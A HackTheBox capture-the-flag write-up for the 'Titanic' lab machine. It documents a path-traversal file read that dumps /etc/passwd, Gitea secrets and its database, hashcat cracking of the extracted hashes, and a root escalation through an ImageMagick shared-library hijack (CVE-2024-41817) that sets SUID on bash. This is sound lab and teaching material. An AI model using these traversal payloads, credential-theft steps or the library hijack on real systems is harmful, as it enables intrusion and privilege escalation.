---
render_with_liquid: false
title: HackTheBox Writeup - Titanic
date: 2025-02-17 13:32:11 +1400
tags: [hackthebox, nmap, linux, feroxbuster, httpx, gobuster, subdomain, python-flask, python, gitea, information-disclosure, directory-traversal, gitea-postexp, discover-secrets, sqlite, hashcat, password-reuse, scheduled-job-abuse, bash-script, image-magick, shared-object-hijack]
image:
    path: https://labs.hackthebox.com/storage/avatars/eb5942ec56dd9b6feb06dcf8af8aefc6.png
    width: 640
    height: 480
---



Titanic is an easy difficulty Linux machine that features an Apache server listening on port 80. The website on port 80 advertises the amenities of the legendary Titanic ship and allows users to book trips. A second vHost is also identified after fuzzing, which points to a `Gitea` server. The Gitea server allows registrations, and exploration of the available repositories reveals some interesting information including the location of a mounted `Gitea` data folder, which is running via a Docker container. Back to the original website, the booking functionality is found to be vulnerable to an Arbitrary File Read exploit, and combining the directory identified from Gitea, it is possible to download the Gitea SQLite database locally. Said database contains hashed credentials for the `developer` user, which can be cracked. The credentials can then be used to login to the remote system over SSH. Enumeration of the file system reveals that a script in the `/opt/scripts` directory is being executed every minute. This script is running the `magick` binary in order to gather information about specific images. This version of `magick` is found to be vulnerable to an arbitrary code execution exploit assigned [CVE-2024-41817](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41817). Successful exploitation of this vulnerability results in elevation of privileges to the `root` user.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ pt init '10.129.122.126 titanic.htb dev.titanic.htb'
+---------+--------+----------------+-----------------+
| PROFILE | STATUS |       IP       |     DOMAIN      |
+---------+--------+----------------+-----------------+
| titanic | on     | 10.129.122.126 | titanic.htb     |
| titanic | on     | 10.129.122.126 | dev.titanic.htb |
+---------+--------+----------------+-----------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Mon Feb 17 13:32:10 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.122.126
Nmap scan report for 10.129.122.126
Host is up, received user-set (0.35s latency).
Scanned at 2025-02-17 13:32:11 CST for 17s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Feb 17 13:32:28 2025 -- 1 IP address (1 host up) scanned in 17.91 seconds
```


## 80 - HTTP : Titanic - Book Your Ship Trip


### Info

```ruby
http://titanic.htb [200] [Titanic - Book Your Ship Trip] [Werkzeug/3.0.3 Python/3.10.12] [9c1dc5566ff9de75f61e833f574ac4e6eba8f904] [Bootstrap:4.5.2,Flask:3.0.3,Popper:2.5.3,Python:3.10.12,jQuery,jQuery CDN,jsDelivr]
```

![](/assets/obsidian/32ea611deaa33010af214eb596f4e7e0.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ URL="http://titanic.htb:80"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/dirb/wordlists/common.txt --scan-dir-listings -C 400,404,500 -r -n -u "$URL" -o "ferox_${OUT}_common.txt"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://titanic.htb:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 💢  Status Code Filters   │ [400, 404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_titanic.htb-80_common.txt
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://titanic.htb/book
200      GET       30l       77w      567c http://titanic.htb/static/styles.css
200      GET     2986l     7000w   469100c http://titanic.htb/static/assets/images/favicon.ico
200      GET      851l     5313w   507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg
200      GET      859l     5115w   510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg
200      GET      890l     5324w   534018c http://titanic.htb/static/assets/images/entertainment.jpg
200      GET      664l     5682w   412611c http://titanic.htb/static/assets/images/home.jpg
200      GET      156l      415w     7399c http://titanic.htb/
403      GET        9l       28w      276c http://titanic.htb/server-status
[####################] - 51s     4626/4626    0s      found:9       errors:5
[####################] - 51s     4614/4614    91/s    http://titanic.htb:80/ 
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://$(pt get rhost) -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://titanic.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.titanic.htb Status: 200 [Size: 13982]
[...]
```


## 80 - VHOST : Gitea 1.22.1


### Info

```bash
$ URL="http://dev.titanic.htb:80"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; echo $URL | httpx -random-agent -td -server -title -fr -sc -hash sha1 -silent -ss -timeout 20 -srd "httpx_$OUT" -o "httpx_$OUT/webprobe.txt"
```

```ruby
http://dev.titanic.htb [200] [Gitea: Git with a cup of tea] [Apache/2.4.52 (Ubuntu)] [0551e9c45e1688fe954e24b6acfad9e5cf39e5ea] [Apache HTTP Server:2.4.52,Gitea,Go,Ubuntu]
```

![](/assets/obsidian/5ea1cdfd1eed4acf49ba2d414dfd2370.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ URL="http://dev.titanic.htb:80"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/dirb/wordlists/common.txt --scan-dir-listings -C 400,404,500 -r -n -u "$URL" -o "ferox_${OUT}_common.txt"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.titanic.htb:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 💢  Status Code Filters   │ [400, 404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_dev.titanic.htb-80_common.txt
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       11c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l      208w     2138c http://dev.titanic.htb/assets/img/logo.svg
200      GET        1l      208w     2138c http://dev.titanic.htb/assets/img/favicon.svg
200      GET       12l       73w      701c http://dev.titanic.htb/api/swagger
200      GET       22l      110w     7803c http://dev.titanic.htb/assets/img/favicon.png
200      GET       47l      313w    25954c http://dev.titanic.htb/assets/img/logo.png
200      GET      308l      945w    11306c http://dev.titanic.htb/user/login
200      GET      310l      954w    11588c http://dev.titanic.htb/user/sign_up
200      GET      419l     2012w    20924c http://dev.titanic.htb/explore/repos
200      GET       10l     3602w   148740c http://dev.titanic.htb/assets/js/webcomponents.js
200      GET        1l      677w    20773c http://dev.titanic.htb/assets/css/theme-gitea-auto.css
200      GET        8l       19w      340c http://dev.titanic.htb/administrator.rss
200      GET      416l     1846w    19997c http://dev.titanic.htb/administrator
200      GET      361l     1596w    16891c http://dev.titanic.htb/administrator/-/packages
200      GET        6l       12w      291c http://dev.titanic.htb/administrator.atom
200      GET       18l       99w     5509c http://dev.titanic.htb/avatars/2e1e70639ac6b0eecbdab4a3d19e0f44
200      GET      392l     1653w    17382c http://dev.titanic.htb/administrator/-/projects
200      GET        0l        0w  1209664c http://dev.titanic.htb/assets/licenses.txt
200      GET        0l        0w   374201c http://dev.titanic.htb/assets/css/index.css
200      GET        0l        0w  1264215c http://dev.titanic.htb/assets/js/index.js
200      GET      275l     1278w    13982c http://dev.titanic.htb/
200      GET       16l      126w     7237c http://dev.titanic.htb/avatars/e2d95b7e207e432f62f3508be406c11b
200      GET      394l     1657w    17375c http://dev.titanic.htb/developer/-/projects
200      GET      505l     2418w    25150c http://dev.titanic.htb/developer
200      GET      158l      442w    14940c http://dev.titanic.htb/developer.rss
200      GET      363l     1600w    16885c http://dev.titanic.htb/developer/-/packages
200      GET      188l      425w    15613c http://dev.titanic.htb/developer.atom
200      GET      439l     1931w    19583c http://dev.titanic.htb/developer/flask-app/stars
200      GET      439l     1931w    19683c http://dev.titanic.htb/developer/docker-config/stars
200      GET      432l     1925w    19603c http://dev.titanic.htb/developer/docker-config/forks
200      GET      432l     1925w    19503c http://dev.titanic.htb/developer/flask-app/forks
200      GET      866l     4783w    49073c http://dev.titanic.htb/developer/docker-config
200      GET      978l     4888w    51402c http://dev.titanic.htb/developer/flask-app
200      GET        2l        5w      285c http://dev.titanic.htb/sitemap.xml
401      GET        1l        1w       50c http://dev.titanic.htb/v2
[####################] - 39s     4720/4720    0s      found:34      errors:10
[####################] - 39s     4614/4614    119/s   http://dev.titanic.htb:80/ 
```


# User Flag
---

## Shell as developer


### 80 - Gitea : Enumerating public repos


#### Info

There are 2 publicly accessible repos from the user `developer`

> http://dev.titanic.htb/explore/repos

![](/assets/obsidian/31da38cbf90edd9c8c35e4bf2ed80c63.png)

There are only 2 users : `developer` and `administrator`

> http://dev.titanic.htb/explore/users

![](/assets/obsidian/f1e812d39f7aa32d0955fa655eaea8af.png)

#### flask-app

> http://dev.titanic.htb/developer/flask-app

![](/assets/obsidian/bf80399ca8222ef01535d0c81ddeb36a.png)

> http://dev.titanic.htb/developer/flask-app/src/branch/main/app.py

The `/download` endpoint uses `os.path.join()`, which ignores relative path if a full path was provided as `ticket`, making it vulnerable to arbitrary file read

![](/assets/obsidian/114de6eae0b4c4b28a3d6809d341ff3f.png)

#### docker-config

> http://dev.titanic.htb/developer/docker-config

![](/assets/obsidian/5bf77461b177085bb657861cc8135071.png)

> http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml

The data directory of **gitea** : `/home/developer/gitea/data` was revealed in `docker-compose.yml` file

![](/assets/obsidian/081b74105876d1ae559fb4ba481698df.png)

### 80 - Titanic : Directory Traversal

Get users with shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ curl -s 'http://titanic.htb/download?ticket=../../../../../../../etc/passwd' | grep -viE 'false$|nologin$|sync$'
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

Extract users and their home directory for low hanging fruit check

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ curl -s 'http://titanic.htb/download?ticket=../../../../../../../etc/passwd' > loot/passwd

┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ cat loot/passwd | grep sh$ | awk -F: '{print $1":"$6}' | tee users-home.lst; cat users-home.lst | cut -d ':' -f1 > users.lst; cat users-home.lst | cut -d ':' -f2- > users_home.lst
root:/root
developer:/home/developer
```

Check possible locations of ssh private key

```bash
ffuf -c --request-proto http -od ffuf -o ffuf -of all -w users_home.lst:FUZZ1 -w /opt/wordlists/custom/ssh_private_keys.txt:FUZZ2 -u "http://titanic.htb/download?ticket=../../../../../../../FUZZ1/FUZZ2" -fc 500 -fs 0
```

![](/assets/obsidian/ae0f3ca1416621a7c6f63f8c14751213.png)

Check interesting files

```bash
ffuf -c --request-proto http -od ffuf -o ffuf -of all -w users_home.lst:FUZZ1 -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt:FUZZ2 -u "http://titanic.htb/download?ticket=../../../../../../../FUZZ1/FUZZ2" -fc 500 -fs 0
```

![](/assets/obsidian/d3d811efd184f69f540ab2cc03dff9aa.png)


### Crack password hashes in gitea database

- Google : `gitea 1.22.1 config file location`

> DOCUMENT - https://docs.gitea.com/administration/config-cheat-sheet

The data directory on docker is at `/data/gitea`

![](/assets/obsidian/f8aae17889e8f3b9a597b7d491210725.png)

The config file should be at `conf/app.ini`

![](/assets/obsidian/39389b8a29da39cb0b941b17e91e70be.png)

After trying some path combinations, we successfully got `app.ini`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ curl -s 'http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/conf/app.ini'
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD =
LOG_SQL = false
SCHEMA =
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY =
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

From `database` section, we know that It's using **sqlite** and the database file is located at `/data/gitea/gitea.db`

Download `gitea.db`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ curl -s 'http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db' > loot/gitea.db
```

Enumerate tables in `gitea.db`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ sqlite3 loot/gitea.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .headers on
sqlite> .mode columns
```

```bash
sqlite> .tables
[...]
language_stat              user
[...]
```

Check `user` table's schema

```bash
sqlite> PRAGMA table_info(user);
cid  name                            type     notnull  dflt_value  pk
---  ------------------------------  -------  -------  ----------  --
0    id                              INTEGER  1                    1
1    lower_name                      TEXT     1                    0
2    name                            TEXT     1                    0
3    full_name                       TEXT     0                    0
4    email                           TEXT     1                    0
5    keep_email_private              INTEGER  0                    0
6    email_notifications_preference  TEXT     1        'enabled'   0
7    passwd                          TEXT     1                    0
8    passwd_hash_algo                TEXT     1        'argon2'    0
9    must_change_password            INTEGER  1        0           0
10   login_type                      INTEGER  0                    0
11   login_source                    INTEGER  1        0           0
12   login_name                      TEXT     0                    0
13   type                            INTEGER  0                    0
14   location                        TEXT     0                    0
15   website                         TEXT     0                    0
16   rands                           TEXT     0                    0
17   salt                            TEXT     0                    0
[...]
```

Select usernames and their hashes

```bash
sqlite> select name,passwd,passwd_hash_algo,salt from user;
name           passwd                                                        passwd_hash_algo  salt
-------------  ------------------------------------------------------------  ----------------  --------------------------------
administrator  cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d4  pbkdf2$50000$50   2d149e5fbd1b20cf31db3e3c6a28fc9b
               59c08d2dfc063b2406ac9207c980c47c5d017136

developer      e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b  pbkdf2$50000$50   8bf3e3452b78544f8bee9400d6936d34
               7cbc8efc5dbef30bf1682619263444ea594cfb56
```

Search the hash type from [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

- Hash format : `sha256:<iterations>:<salt>:<hash>`

![](/assets/obsidian/f4677d3d668563171318cca438ca9bdc.png)

The required hash and salt are in base64 format, but the ones we have seems to be hex

Print the hex as ASCII and convert them to base64 to output in **hashcat**'s hash format

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ sqlite3 loot/gitea.db 'select name,passwd,salt from user;' | while IFS='|' read -r user hash salt; do echo "${user}:sha256:50000:$(echo -n $salt | xxd -r -p | base64 -w0):$(echo -n $hash | xxd -r -p | base64 -w0)"; done | tee loot/gitea_user.hash
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

Crack the hashes

```bash
hashcat loot/gitea_user.hash /opt/wordlists/rockyou.txt --user
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ hashcat loot/gitea_user.hash /opt/wordlists/rockyou.txt --user --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```


### 22 - SSH : Password reuse

```bash
┌──(bravosec㉿fsociety)-[~/htb/Titanic]
└─$ cssh $(pt get rhost) developer 25282528
Warning: Permanently added 'titanic.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Feb 17 11:35:45 AM UTC 2025

  System load:           0.0
  Usage of /:            80.3% of 6.79GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.122.126
  IPv6 address for eth0: dead:beef::250:56ff:fe94:3d4b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

developer@titanic:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
developer@titanic:~$ cat user.txt
985b90a69b21a06ad98bce4bdfaad457
```


# Root Flag
---

## From developer to root


### Situation awareness

We can't see processes other than ours

```bash
developer@titanic:~$ ps auxfw5
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
develop+  226102  0.0  0.1   8812  5576 pts/0    Ss   11:35   0:00 -bash
develop+  226171  0.0  0.0  10044  1608 pts/0    R+   11:37   0:00  \_ ps auxfw5
develop+    1637  0.2  4.6 1539712 182800 ?      Ssl  04:20   1:11 /usr/local/bin/gitea web
develop+  226001  0.1  0.2  17064  9728 ?        Ss   11:35   0:00 /lib/systemd/systemd --user
develop+    1148  1.3  0.8 1064988 33464 ?       Ss   04:20   6:06 /usr/bin/python3 /opt/app/app.py
```

`/etc/fstab` was configured with `hidepid` to harden `/proc`, so we can't run **pspy** to enumerate **cron** jobs

```bash
developer@titanic:~$ cat /etc/fstab

# /etc/fstab: static file system information.

#

# Use 'blkid' to print the universally unique identifier for a

# device; this may be used with UUID= as a more robust way to name devices

# that works even if disks are added and removed. See fstab(5).

#

# <file system> <mount point>   <type>  <options>       <dump>  <pass>

# / was on /dev/sda2 during curtin installation
/dev/sda2 / ext4 defaults 0 1
/dev/sda3 none swap sw 0 0
proc /proc proc defaults,nosuid,nodev,noexec,relatime,hidepid=2 0 0
```


### ImageMagick 7.1.1 - Arbitrary Code Execution

There's a script owned by `root` at `/opt/scripts/identify_images.sh`

```bash
developer@titanic:~$ ls -latr /opt
total 20
drwxr-xr-x 19 root root      4096 Feb  7 10:37 ..
drwxr-xr-x  2 root root      4096 Feb  7 10:37 scripts
drwx--x--x  4 root root      4096 Feb  7 10:37 containerd
drwxr-xr-x  5 root root      4096 Feb  7 10:37 .
drwxr-xr-x  5 root developer 4096 Feb  7 10:37 app
developer@titanic:~$ ls -latr /opt/scripts/
total 12
-rwxr-xr-x 1 root root  167 Feb  3 17:11 identify_images.sh
drwxr-xr-x 2 root root 4096 Feb  7 10:37 .
drwxr-xr-x 5 root root 4096 Feb  7 10:37 ..
```

- It calls `/usr/bin/magick` to identify `.jpg` files in `/opt/app/static/assets/images/` that `developer` group can control
- The command output will be stored in `/opt/app/static/assets/images/metadata.log`

```bash
developer@titanic:~$ cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Since `/opt/app/static/assets/images/metadata.log` changes every 1 minute, `identify_images.sh` is highly possible to be run by a cron job as root

```bash
developer@titanic:~$ ls -latr /opt/app/static/assets/images/
total 1288
-rw-r----- 1 root developer 291864 Feb  3 17:13 entertainment.jpg
-rw-r----- 1 root developer 280817 Feb  3 17:13 luxury-cabins.jpg
-rw-r----- 1 root developer 232842 Feb  3 17:13 home.jpg
-rw-r----- 1 root developer 209762 Feb  3 17:13 favicon.ico
-rw-r----- 1 root developer 280854 Feb  3 17:13 exquisite-dining.jpg
drwxrwx--- 2 root developer   4096 Feb  3 17:13 .
drwxr-x--- 3 root developer   4096 Feb  7 10:37 ..
-rw-r----- 1 root developer    442 Feb 17 11:48 metadata.log
```

Check **ImageMagick**'s version

```bash
developer@titanic:~$ /usr/bin/magick -h
Usage: magick tool [ {option} | {image} ... ] {output_image}
Usage: magick [ {option} | {image} ... ] {output_image}
       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]
       magick -help | -version | -usage | -list {option}

magick: invalid argument for option -h @ error/magick-cli.c/MagickImageCommand/991.
developer@titanic:~$ /usr/bin/magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

- Google : `ImageMagick 7.1.1-35 exploit`

> Details & POC - https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

![](/assets/obsidian/680a36c8068d990dcc31f06e6f7f49d3.png)

![](/assets/obsidian/6f7e9abc4b6d8375b155418c605e54fd.png)

> - Empty path to `MAGICK_CONFIGURE_PATH` isn't abusable since the `find` command from the script only retrieve `.jpg` files that are not **symlink** / **hardlink**
> - We can abuse empty path to `LD_LIBRARY_PATH` in this case to load our malicious shared library
{: .prompt-info }

Create a shared library in `/opt/app/static/assets/images/` that gives `/bin/bash` **SETUID** bits

```bash
developer@titanic:~$ cd /opt/app/static/assets/images/
```

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>
__attribute__((constructor)) void init(){
    system("chmod +s /bin/bash");
    exit(0);
}
EOF
```

![](/assets/obsidian/633d970955c07619e40da5ff6940a75d.png)

Wait for the script to run

```bash
developer@titanic:/opt/app/static/assets/images$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Start **bash** with `-p` option to preserve `euid` and `egid` of `root` user, then start a new shell as `root` with the help of **python**'s `os.setuid()` function

```bash
developer@titanic:/opt/app/static/assets/images$ bash -p
bash-5.1# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
bash-5.1# id
uid=0(root) gid=1000(developer) egid=0(root) groups=0(root),1000(developer)
bash-5.1# cat /root/root.txt
31e914ee4d273b0d2f78d48e24785572
```

# Additional
---

## Post exploitation


### Secrets

```bash
bash-5.1# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$FEVNYiA6DwY7GiuIjF42Y0$DqhzPlCnT7fI5E3c6LQ0Wx7ym/PhY0swKTKUczhwwv6:19937:0:99999:7:::
developer:$y$j9T$Sof1eV6yeubj9QaCTbzxd1$WsWRB9X8pgYiJozBaqsEsA/wJRjlWk6iKXv6VNG/fU5:19937:0:99999:7:::
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```